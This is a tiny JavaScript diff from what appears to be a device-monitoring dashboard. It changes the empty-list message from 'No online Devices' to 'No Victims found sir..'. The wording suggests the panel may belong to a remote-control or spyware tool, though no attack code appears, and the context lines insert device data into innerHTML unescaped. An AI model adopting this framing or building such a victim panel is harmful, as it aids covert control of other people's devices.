@@ -65,7 +65,7 @@ uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+ave
 }
 }
 else{
-uo2.innerHTML="No online Devices";
+uo2.innerHTML="No Victims found sir..";
 }
 });
 }
